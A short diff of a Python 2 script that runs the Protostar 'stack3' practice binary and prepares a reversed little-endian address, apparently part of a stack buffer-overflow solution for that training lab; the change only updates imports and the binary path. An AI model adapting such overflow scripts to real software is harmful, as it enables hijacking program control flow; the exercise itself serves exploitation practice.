@@ -1,8 +1,8 @@
 #!/usr/bin/env python2.6
 
-from subprocess import Popen, PIPE
+import subprocess
 
-p = Popen("/home/adam/stack3",stdin=PIPE)
+p = subprocess.Popen("/opt/protostar/bin/stack3",stdin=subprocess.PIPE)
 
 flag = reversed('\x08\x04\x84\x24')
 
